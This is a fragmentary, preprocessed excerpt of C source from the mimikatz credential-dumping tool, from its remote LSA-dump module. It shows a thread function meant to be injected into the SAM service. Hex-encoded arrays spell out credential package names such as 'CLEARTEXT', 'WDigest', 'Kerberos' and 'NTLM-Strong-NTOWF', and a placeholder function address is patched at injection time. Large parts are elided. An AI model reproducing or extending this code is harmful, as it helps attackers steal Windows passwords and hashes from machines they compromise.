# 1 "/Users/tamofplease/Workspace/research/docker-exp/workspace/mimikatz/mimikatz/modules/kuhl_m_lsadump_remote.c"
...
DWORD WINAPI kuhl_sekurlsa_samsrv_thread(PREMOTE_LIB_DATA lpParameter)
{
 ...
 DWORD kn[][10] = {
  {0x004C0043, 0x00410045, 0x00540052, 0x00580045, 0x00000054},
  {0x00440057, 0x00670069, 0x00730065, 0x00000074},
  {0x0065004b, 0x00620072, 0x00720065, 0x0073006f, 0x00000000},
  {0x0065004b, 0x00620072, 0x00720065, 0x0073006f, 0x004e002d, 0x00770065, 0x00720065, 0x004b002d, 0x00790065, 0x00000073},
  {0x0054004e, 0x004d004c, 0x0053002d, 0x00720074, 0x006e006f, 0x002d0067, 0x0054004e, 0x0057004f, 0x00000046},
 };
 UNICODE_STRING knu[] = {
  {18, 18, (PWSTR) kn[0]},
  {14, 14, (PWSTR) kn[1]},
 ...
 {
  if(NT_SUCCESS(((PSAMROPENDOMAIN) 0x4444444444444444)(hSam, 0x10000000, lpParameter->input.inputData , &hDomain)))
  {
